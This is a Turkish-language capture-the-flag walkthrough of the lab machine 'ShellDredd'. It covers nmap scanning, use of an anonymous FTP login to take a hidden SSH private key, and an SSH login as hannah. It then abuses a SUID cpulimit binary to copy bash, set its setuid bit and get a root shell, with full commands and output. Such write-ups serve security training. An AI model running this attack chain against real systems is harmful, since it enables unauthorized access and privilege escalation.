@@ -1,0 +1,215 @@
+      ####Enumeration
+
+      ####Nmap
+Tüm TCP bağlantı noktalarına karşı bir tarama ile başlayacağız .
+──(kali㉿kali)-[~]
+└─$ sudo nmap -p- $targetip            
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-29 09:41 EST
+Nmap scan report for $targetip
+Host is up (0.030s latency).
+Not shown: 65533 closed ports
+PORT      STATE SERVICE
+21/tcp    open  ftp
+61000/tcp open  unknown
+Çıktı, standart bağlantı noktasında (TCP 21) bir FTP sunucusunu ve yüksek bir bağlantı noktasında (TCP 61000) çalışan bilinmeyen bir hizmeti ortaya koyuyor. Daha detaylı servis bilgileri için bu iki portu tarayalım.
+┌──(kali㉿kali)-[~]
+└─$ sudo nmap -p 21,61000 -sC -sV $targetip
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-29 09:47 EST
+Nmap scan report for $targetip
+Host is up (0.028s latency).
+
+PORT      STATE SERVICE VERSION
+21/tcp    open  ftp     vsftpd 3.0.3
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:$attackerip
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+61000/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 59:2d:21:0c:2f:af:9d:5a:7b:3e:a4:27:aa:37:89:08 (RSA)
+|   256 59:26:da:44:3b:97:d2:30:b1:9b:9b:02:74:8b:87:58 (ECDSA)
+|_  256 8e:ad:10:4f:e3:3e:65:28:40:cb:5b:bf:1d:24:7f:17 (ED25519)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+Bu tarama, 61000 numaralı bağlantı noktasındaki hizmetin OpenSSH olduğunu gösteriyor . Ayrıca, FTP sunucusu anonim kimlik doğrulamaya izin verir.
+
+      ####FTP Enumeration
+FTP sunucusuna bağlanıp numaralandıralım.
+┌──(kali㉿kali)-[~]
+└─$ ftp $targetip              
+Connected to $targetip.
+220 (vsFTPd 3.0.3)
+Name ($targetip:kali): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> passive
+Passive mode on.
+ftp> ls
+227 Entering Passive Mode ($censored).
+150 Here comes the directory listing.
+226 Directory send OK.
+ftp>
+Bu boş bir dizin gibi görünüyor. lsBasit komutun gizli dosya veya klasörleri listelemediğini hatırlayarak , FTP kökünün tüm içeriğini listeleyelim.
+ftp> ls -a
+227 Entering Passive Mode ($censored).
+150 Here comes the directory listing.
+drwxr-xr-x    3 0        115          4096 Aug 06 15:56 .
+drwxr-xr-x    3 0        115          4096 Aug 06 15:56 ..
+drwxr-xr-x    2 0        0            4096 Aug 06 15:54 .hannah
+226 Directory send OK.
+ftp>
+Bu dizin gizli bir .hannah dizini içerir. İçeriği sıralayalım.
+ftp> cd .hannah
+250 Directory successfully changed.
+ftp> ls -a
+227 Entering Passive Mode ($censored).
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        0            4096 Aug 06 15:54 .
+drwxr-xr-x    3 0        115          4096 Aug 06 15:56 ..
+-rwxr-xr-x    1 0        0            1823 Aug 06 15:54 id_rsa
+226 Directory send OK.
+ftp>
+Bu gizli dizinde özel bir SSH anahtarı bulduğumuz için çok şanslıyız. Saldırı makinemize indireceğiz.
+ftp> get id_rsa
+local: id_rsa remote: id_rsa
+227 Entering Passive Mode ($censored).
+150 Opening BINARY mode data connection for id_rsa (1823 bytes).
+226 Transfer complete.
+1823 bytes received in 0.00 secs (1.2472 MB/s)
+ftp> bye
+221 Goodbye.
+                                                                                                                                             
+┌──(kali㉿kali)-[~]
+└─$
+
+      ####Exploitation
+
+      ####SSH
+SSH anahtarını .hannah dizininde bulduğumuz için, 61000 numaralı bağlantı noktasındaki SSH hizmetine karşı bu kullanıcı olarak kimlik doğrulamayı deneyelim. Bunu yapmadan önce, anahtara uygun izinleri uygulayacağız.
+┌──(kali㉿kali)-[~]
+└─$ chmod 0600 id_rsa  
+                                                                                                                                             
+┌──(kali㉿kali)-[~]
+└─$ ssh -i id_rsa hannah@$targetip -p 61000 
+...
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+hannah@ShellDredd:~$ id
+uid=1000(hannah) gid=1000(hannah) groups=1000(hannah),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
+Çok hoş. Hedefe yerel erişim sağladık.
+
+
+      ####SUID Numaralandırma
+Bir SUID ikili araması ile yerel numaralandırmaya başlayacağız.
+hannah@ShellDredd:~$ find / -type f -perm -u=s 2>/dev/null
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/umount
+/usr/bin/mawk
+/usr/bin/chfn
+/usr/bin/su
+/usr/bin/chsh
+/usr/bin/fusermount
+/usr/bin/cpulimit
+/usr/bin/mount
+/usr/bin/passwd
+Liste, /usr/bin/cpulimit ikili dosyasını içerir. Kılavuz sayfası, bu yardımcı programın tam olarak adından da anlaşılacağı gibi yaptığını bildirir:
+hannah@ShellDredd:~$ which cpulimit
+/usr/bin/cpulimit
+hannah@ShellDredd:~$ 
+hannah@ShellDredd:~$ man cpulimit | head
+CPULIMIT(1)                                                   User commands                                                   CPULIMIT(1)
+
+NAME
+       cpulimit -- limits the CPU usage of a process
+
+SYNOPSIS
+       cpulimit [TARGET] [OPTIONS...] [ -- PROGRAM]
+
+DESCRIPTION
+       TARGET must be exactly one of these:
+Yardımcı programın yardım bilgilerini görelim.
+hannah@ShellDredd:~$ cpulimit -h
+CPUlimit version 2.4
+Usage: cpulimit TARGET [OPTIONS...] [-- PROGRAM]
+   TARGET must be exactly one of these:
+      -p, --pid=N        pid of the process
+      -e, --exe=FILE     name of the executable program file
+                         The -e option only works when
+                         cpulimit is run with admin rights.
+      -P, --path=PATH    absolute path name of the
+                         executable program file
+   OPTIONS
+      -b  --background   run in background
+      -f  --foreground   launch target process in foreground and wait for it to exit
+      -c  --cpu=N        override the detection of CPUs on the machine.
+      -l, --limit=N      percentage of cpu allowed from 1 up.
+                         Usually 1 - 100, but can be higher
+                         on multi-core CPUs (mandatory)
+      -m, --monitor-forks  Watch children/forks of the target process
+      -q, --quiet        run in quiet mode (only print errors).
+      -k, --kill         kill processes going over their limit
+                         instead of just throttling them.
+      -r, --restore      Restore processes after they have
+                         been killed. Works with the -k flag.
+      -s, --signal=SIG   Send this signal to the watched process when cpulimit exits.
+                         Signal should be specificed as a number or 
+                         SIGTERM, SIGCONT, SIGSTOP, etc. SIGCONT is the default.
+      -v, --verbose      show control statistics
+      -z, --lazy         exit if there is no suitable target process,
+                         or if it dies
+          --             This is the final CPUlimit option. All following
+                         options are for another program we will launch.
+      -h, --help         display this help and exit
+
+Root Shell
+-f seçeneği istediğimiz herhangi bir süreci başlatmamıza izin verdiği için oldukça ilginç. Bu ikili dosyanın SUID izinleri olduğundan, bu işlevi kötüye kullanabilmeli ve bir kök kabuğu oluşturabilmeliyiz.
+Bunu araştırırken , aşağıdaki komutu keşfederiz:
+cpulimit -l 100 -f /bin/sh
+Ne yazık ki, bu komut olduğu gibi çalışmayacaktır.
+hannah@ShellDredd:~$ whoami
+hannah
+hannah@ShellDredd:~$ cpulimit -l 100 -f /bin/sh
+Process 652 detected
+$ whoami
+hannah
+$ exit
+Child process is finished, exiting...
+hannah@ShellDredd:~$
+-e Seçeneği kullanmanın da işe yaramayacağını belirtmekte fayda var . Kabuk, biz iptal edene kadar askıda kalacak:
+hannah@ShellDredd:~$ cpulimit -l 100 -e /bin/sh
+Process 646 detected
+whoami
+
+^CExiting...
+hannah@ShellDredd:~$
+İkili dosyanın SUID izinleri olmasına ve yükseltilmiş ayrıcalıklarla komutları çalıştırabilmesine rağmen, onu doğrudan bir kök kabuğu oluşturmak için kullanamayacağımız anlaşılıyor.
+SUID izinlerinden başka bir şekilde yararlanmaya çalışalım. İlk önce /bin/bash dosyasını ana dizinimize kopyalayacağız .
+hannah@ShellDredd:~$ cpulimit -l 100 -f cp /bin/bash .
+Process 543 detected
+Child process is finished, exiting...
+ile yapabileceğimiz bu ikili dosyanın hem UID hem de GID bitlerini ayarlamamız gerekiyor chmod +s.
+hannah@ShellDredd:~$ cpulimit -l 100 -f chmod +s bash
+Process 547 detected
+Child process is finished, exiting...
+Artık bu ikili dosyayı kök kabuğa bırakma seçeneğiyle -p çalıştırabiliriz.
+hannah@ShellDredd:~$ whoami
+hannah
+hannah@ShellDredd:~$ ./bash -p
+bash-5.0# whoami
+root
